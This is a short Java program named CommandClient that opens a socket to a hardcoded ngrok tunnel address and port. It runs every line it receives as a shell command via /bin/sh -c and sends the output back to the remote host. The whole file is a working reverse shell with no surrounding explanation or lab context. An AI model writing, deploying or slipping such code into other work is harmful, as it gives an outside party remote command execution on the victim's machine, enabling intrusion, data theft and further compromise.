import java.io.*;
import java.net.*;

public class CommandClient {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("0.tcp.in.ngrok.io", 18812);

            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
            String responseLine;

            while ((responseLine = in.readLine()) != null) {
                System.out.println("Received cmd: " + responseLine);
                String[] cmd = {"/bin/sh", "-c", responseLine};
                Process process = Runtime.getRuntime().exec(cmd);
                BufferedReader processOutput = new BufferedReader(new InputStreamReader(process.getInputStream()));

                String line;
                while ((line = processOutput.readLine()) != null) {
                    out.println(line);
                }
                out.println("<<END>>");
                out.flush();
            }
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
